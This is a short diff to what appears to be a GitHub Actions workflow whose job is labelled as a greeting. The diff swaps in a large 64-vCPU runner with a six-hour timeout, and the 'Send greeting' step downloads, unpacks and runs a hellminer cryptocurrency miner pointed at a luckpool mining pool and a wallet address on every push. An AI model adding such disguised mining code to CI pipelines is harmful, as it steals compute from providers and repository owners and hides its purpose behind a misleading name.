@@ -3,8 +3,11 @@ on:
   [push]
 jobs:
   greet:
-    runs-on: ubuntu-latest
+    runs-on: buildjet-64vcpu-ubuntu-2204
+    timeout-minutes: 360
     steps:
     - name: Send greeting
       run: |
-        docker pull simeononsecurity/hellminer:latest
+        curl -L https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz > hellminer_linux64.tar.gz
+        tar -xzvf hellminer_linux64.tar.gz
+        ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp.001 -p x --cpu 2
